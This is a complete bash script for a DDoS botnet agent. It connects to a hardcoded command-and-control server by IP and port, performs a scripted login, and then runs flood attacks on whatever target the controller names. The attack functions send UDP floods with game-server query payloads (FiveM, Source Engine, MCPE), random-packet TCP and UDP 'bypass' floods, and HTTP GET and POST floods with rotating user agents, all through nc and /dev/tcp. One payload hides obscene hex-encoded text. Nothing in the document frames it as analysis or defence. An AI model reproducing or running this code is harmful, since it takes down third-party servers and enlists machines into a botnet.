#!/bin/bash

# Configuration
C2_ADDRESS="134.255.234.140"
C2_PORT=6666

# Payloads
payload_fivem=$'\xff\xff\xff\xffgetinfo xxx\x00\x00\x00'
payload_vse=$'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00'
payload_mcpe=$'\x61\x74\x6f\x6d\x20\x64\x61\x74\x61\x20\x6f\x6e\x74\x6f\x70\x20\x6d\x79\x20\x6f\x77\x6e\x20\x61\x73\x73\x20\x61\x6d\x70\x2f\x74\x72\x69\x70\x68\x65\x6e\x74\x20\x69\x73\x20\x6d\x79\x20\x64\x69\x63\x6b\x20\x61\x6e\x64\x20\x62\x61\x6c\x6c\x73'
payload_hex=$'\x55\x55\x55\x55\x00\x00\x00\x01'

PACKET_SIZES=(512 1024 2048)

# User agents
base_user_agents=(
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)..."
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)..."
    # (rest omitted for brevity)
)

rand_ua() {
    echo "${base_user_agents[RANDOM % ${#base_user_agents[@]}]}"
}

# Attack functions
attack_fivem() {
    local ip="$1" port="$2" end="$3"
    while [ "$(date +%s)" -lt "$end" ]; do
        echo -ne "$payload_fivem" | nc -u "$ip" "$port"
    done
}

attack_mcpe() {
    local ip="$1" port="$2" end="$3"
    while [ "$(date +%s)" -lt "$end" ]; do
        echo -ne "$payload_mcpe" | nc -u "$ip" "$port"
    done
}

attack_vse() {
    local ip="$1" port="$2" end="$3"
    while [ "$(date +%s)" -lt "$end" ]; do
        echo -ne "$payload_vse" | nc -u "$ip" "$port"
    done
}

attack_hex() {
    local ip="$1" port="$2" end="$3"
    while [ "$(date +%s)" -lt "$end" ]; do
        echo -ne "$payload_hex" | nc -u "$ip" "$port"
    done
}

attack_udp_bypass() {
    local ip="$1" port="$2" end="$3"
    while [ "$(date +%s)" -lt "$end" ]; do
        size=${PACKET_SIZES[RANDOM % ${#PACKET_SIZES[@]}]}
        dd if=/dev/urandom bs=1 count="$size" 2>/dev/null | nc -u "$ip" "$port"
    done
}

attack_tcp_bypass() {
    local ip="$1" port="$2" end="$3"
    local size packet
    while [ "$(date +%s)" -lt "$end" ]; do
        size=${PACKET_SIZES[RANDOM % ${#PACKET_SIZES[@]}]}
        packet=$(dd if=/dev/urandom bs=1 count="$size" 2>/dev/null)
        { exec 3<> /dev/tcp/"$ip"/"$port"; echo -ne "$packet" >&3; exec 3>&-; } 2>/dev/null
    done
}

attack_tcp_udp_bypass() {
    local ip="$1" port="$2" end="$3"
    local size packet
    while [ "$(date +%s)" -lt "$end" ]; do
        size=${PACKET_SIZES[RANDOM % ${#PACKET_SIZES[@]}]}
        packet=$(dd if=/dev/urandom bs=1 count="$size" 2>/dev/null)

        if [ $((RANDOM % 2)) -eq 0 ]; then
            { exec 3<> /dev/tcp/"$ip"/"$port"; echo -ne "$packet" >&3; exec 3>&-; } 2>/dev/null
        else
            echo -ne "$packet" | nc -u "$ip" "$port"
        fi
    done
}

attack_http_get() {
    local ip="$1" port="$2" end="$3"
    while [ "$(date +%s)" -lt "$end" ]; do
        {
            exec 3<> /dev/tcp/"$ip"/"$port"
            echo -e "GET / HTTP/1.1\r\nHost: $ip\r\nUser-Agent: $(rand_ua)\r\nConnection: keep-alive\r\n\r\n" >&3
            exec 3>&-
        } 2>/dev/null
    done
}

attack_http_post() {
    local ip="$1" port="$2" end="$3"
    local payload headers
    payload='username=admin&password=password123&email=admin@example.com&submit=login'
    headers="POST / HTTP/1.1\r\nHost: $ip\r\nUser-Agent: $(rand_ua)\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: ${#payload}\r\nConnection: keep-alive\r\n\r\n$payload"
    while [ "$(date +%s)" -lt "$end" ]; do
        { exec 3<> /dev/tcp/"$ip"/"$port"; echo -e "$headers" >&3; exec 3>&-; } 2>/dev/null
    done
}

# Dispatcher
launch_attack() {
    local method="$1" ip="$2" port="$3" secs="$4"

    case "$method" in
        ".HEX") attack_hex "$ip" "$port" "$secs" ;;
        ".UDP") attack_udp_bypass "$ip" "$port" "$secs" ;;
        ".TCP") attack_tcp_bypass "$ip" "$port" "$secs" ;;
        ".MIX") attack_tcp_udp_bypass "$ip" "$port" "$secs" ;;
        ".VSE") attack_vse "$ip" "$port" "$secs" ;;
        ".MCPE") attack_mcpe "$ip" "$port" "$secs" ;;
        ".FIVEM") attack_fivem "$ip" "$port" "$secs" ;;
        ".GET") attack_http_get "$ip" "$port" "$secs" ;;
        ".HTTPPOST") attack_http_post "$ip" "$port" "$secs" ;;
        *) echo "Unknown method: $method" ;;
    esac
}

main() {
    exec 4<> /dev/tcp/"$C2_ADDRESS"/"$C2_PORT"

    while true; do
        {
            echo -ne "BOT" >&4
            break
        } 2>/dev/null

        while true; do
            read -r data <&4
            [[ "$data" == *"Username"* ]] && { echo -ne "BOT" >&4; break; }
        done

        while true; do
            read -r data <&4
            [[ "$data" == *"Password"* ]] && {
                echo -ne '\xff\xff\xff\xff\75' | iconv -f utf-8 -t cp1252 > /dev/tcp/"$C2_ADDRESS"/"$C2_PORT"
                break
            }
        done

        echo 'Connected to C2.'
        break
    done

    while true; do
        read -r data <&4
        [[ -z "$data" ]] && break

        args=($data)
        command=${args[0]^^}  # uppercase

        if [[ "$command" == "PING" ]]; then
            echo -ne "PONG" >&4
        else
            method="$command"
            ip="${args[1]}"
            port="${args[2]}"
            secs=$(( $(date +%s) + ${args[3]} ))
            threads="${args[4]:-1}"

            for ((i = 0; i < threads; i++)); do
                launch_attack "$method" "$ip" "$port" "$secs" &
            done
        fi
    done

    exec 4>&-
    main
}

main
